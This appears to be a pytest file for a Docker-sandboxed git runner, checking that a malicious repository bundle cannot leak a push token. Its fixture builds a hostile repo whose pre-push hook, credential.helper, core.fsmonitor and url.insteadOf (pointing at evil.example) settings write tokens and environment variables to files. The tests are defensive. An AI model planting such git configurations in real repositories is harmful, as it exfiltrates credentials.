import subprocess
import uuid
from pathlib import Path

import docker
import pytest
from docker.errors import NotFound

from swfactory.gitops.github import GITOPS_REPO, GITOPS_XFER, GitopsRunner, git_argv
from swfactory.sandbox.base import TransferTooLarge
from swfactory.sandbox.template import gitops_volume

pytestmark = pytest.mark.docker

IMAGE = "swfactory/runner:0.1.0"
R, B = "acme/web", "factory/001-x"


def host_git(cwd: Path, *args: str) -> str:
    env = {
        "GIT_CONFIG_GLOBAL": "/dev/null",
        "GIT_CONFIG_NOSYSTEM": "1",
        "PATH": "/usr/bin:/bin:/usr/local/bin",
    }
    return subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@t", *args],
        cwd=cwd,
        env=env,
        check=True,
        capture_output=True,
        text=True,
    ).stdout


@pytest.fixture
def client():
    return docker.from_env()


@pytest.fixture
def job_id(client):
    jid = uuid.uuid4()
    yield jid
    try:
        client.volumes.get(gitops_volume(jid)).remove(force=True)
    except NotFound:
        pass


@pytest.fixture
def runner(client, tmp_path):
    # the default bridge stands in for gitops-net (a compose-created network)
    return GitopsRunner(lambda: client, image=IMAGE, network="bridge", spool_dir=tmp_path / "spool")


@pytest.fixture
def hostile_bundle(tmp_path) -> Path:
    repo = tmp_path / "hostile"
    repo.mkdir()
    host_git(repo, "init", "-b", B)
    (repo / "a.txt").write_text("x")
    hooks = repo / "hooks"
    hooks.mkdir()
    (hooks / "pre-push").write_text("#!/bin/sh\necho $GIT_TOKEN > /git/leak3\n")
    (hooks / "pre-push").chmod(0o755)
    for k, v in {
        "credential.helper": "!cat >/git/leak",
        "core.hooksPath": "hooks",
        "url.https://evil.example/.insteadOf": "https://git-fixture/",
        "core.fsmonitor": "!env >/git/leak2",
    }.items():
        host_git(repo, "config", k, v)
    host_git(repo, "add", "-A")
    host_git(repo, "-c", "core.hooksPath=/dev/null", "commit", "-m", "c")
    out = tmp_path / "job.bundle"
    host_git(repo, "bundle", "create", str(out), f"refs/heads/{B}")
    return out


def files_in(client, vol: str, job_id) -> set[str]:
    out = client.containers.run(
        IMAGE,
        ["ls", "-A", "/git"],
        volumes={vol: {"bind": "/git", "mode": "ro"}},
        remove=True,
        user="10001",
    )
    return set(out.decode().split())


async def test_planted_repo_config_never_sees_token(client, runner, job_id, hostile_bundle):
    await runner.put_file(job_id, f"{GITOPS_XFER}/job.bundle", hostile_bundle)
    init = await runner.run(job_id, git_argv("init", repo=R), token=None)
    assert init.exit_code == 0, init.stderr
    imp = await runner.run(job_id, git_argv("import_bundle", repo=R, branch=B), token=None)
    assert imp.exit_code == 0, imp.stderr
    # push to a host that does not resolve: it fails, and the token is never echoed
    res = await runner.run(
        job_id,
        git_argv(
            "push", repo=R, branch=B, expect_sha="", remote_base="https://git-fixture.invalid"
        ),
        token="ghs_secret",
    )
    assert res.exit_code != 0 and "ghs_secret" not in res.stdout + res.stderr
    names = files_in(client, gitops_volume(job_id), job_id)
    assert names.isdisjoint({"leak", "leak2", "leak3"})
    cfg = await runner.run(job_id, ["cat", f"{GITOPS_REPO}/config"], token=None)
    assert "ghs_secret" not in cfg.stdout and "evil.example" not in cfg.stdout
    assert "hooks" not in cfg.stdout


@pytest.mark.skip(
    reason="opt-in: needs a TLS git smart-HTTP fixture trusted by the image (M0 S11 / M8.6 e2e)"
)
async def test_push_sends_token_only_to_pinned_host():
    raise AssertionError


async def test_get_file_over_max_bytes_raises(runner, job_id, tmp_path, hostile_bundle):
    await runner.put_file(job_id, f"{GITOPS_XFER}/job.bundle", hostile_bundle)
    with pytest.raises(TransferTooLarge):
        await runner.get_file(job_id, f"{GITOPS_XFER}/job.bundle", tmp_path / "x", max_bytes=1)
    n = await runner.get_file(job_id, f"{GITOPS_XFER}/job.bundle", tmp_path / "y", max_bytes=10**7)
    assert n == hostile_bundle.stat().st_size


async def test_gitops_timeout_names_the_setting(runner, job_id):
    r = await runner.run(job_id, ["sleep", "5"], token=None, timeout_s=1)
    assert r.timed_out and r.exit_code != 0
    assert "timed out after 1 s; raise FACTORY_GITOPS_TIMEOUT_S" in r.stderr
